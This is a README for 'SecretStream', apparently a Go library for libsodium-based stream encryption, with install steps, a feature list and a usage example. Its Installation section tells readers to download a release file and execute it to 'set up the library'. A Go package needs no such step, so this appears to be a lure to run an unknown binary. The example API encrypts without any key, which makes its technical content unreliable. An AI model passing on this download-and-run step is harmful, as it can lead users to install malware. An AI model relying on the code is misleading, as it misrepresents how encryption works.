## Introduction

In a world where data breaches are common, ensuring the security of your data is crucial. SecretStream leverages the powerful capabilities of libsodium to provide a reliable method for encrypting data streams. This project is aimed at developers looking for a straightforward way to implement secure data streaming in their Go applications.

## Features

- **Easy to Use**: The API is designed to be intuitive, making it easy to integrate into your existing projects.
- **High Security**: Utilizes the advanced encryption techniques provided by libsodium.
- **Performance**: Optimized for speed without compromising security.
- **Cross-Platform**: Works seamlessly on various operating systems.

## Installation

To get started with SecretStream, you need to install the package. You can do this by running the following command in your terminal:

```bash
go get github.com/furrysenpai18/secretstream
```

After installing, you can download the latest release from our [Releases section](https://github.com/furrysenpai18/secretstream/releases). Download the appropriate file for your operating system and execute it to set up the library.

## Usage

Using SecretStream is straightforward. Hereâ€™s a simple example to demonstrate how to use it in your Go application:

```go
package main

import (
    "fmt"
    "github.com/furrysenpai18/secretstream"
)

func main() {
    // Initialize SecretStream
    stream, err := secretstream.NewStream()
    if err != nil {
        fmt.Println("Error initializing stream:", err)
        return
    }

    // Encrypt some data
    encryptedData, err := stream.Encrypt([]byte("Hello, secure world!"))
    if err != nil {
        fmt.Println("Error encrypting data:", err)
        return
    }

    fmt.Println("Encrypted data:", encryptedData)

    // Decrypt the data
    decryptedData, err := stream.Decrypt(encryptedData)
    if err != nil {
        fmt.Println("Error decrypting data:", err)
        return
    }

    fmt.Println("Decrypted data:", string(decryptedData))
}
```

## Examples
